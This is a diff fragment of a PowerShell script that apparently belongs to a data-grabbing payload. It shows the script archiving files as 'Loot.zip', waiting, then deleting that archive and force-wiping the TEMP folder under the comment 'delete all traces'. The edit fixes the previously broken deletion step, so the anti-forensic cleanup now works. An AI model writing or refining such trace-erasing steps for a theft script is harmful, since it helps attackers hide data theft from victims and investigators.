@@ -14,10 +14,10 @@ Compress-Archive @compress
 #delete all traces
 
 #delay
-Start-Sleep -Seconds 4
+Start-Sleep -Seconds 3
 
-#delete created archive [DOES NOT WORK YET]
-Remove-Item $env:USERPROFILE + "\Desktop\Loot.zip"
+#delete created archive
+Remove-Item -Path $env:USERPROFILE"\Desktop\Loot.zip"
 
 #temp folder
 rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
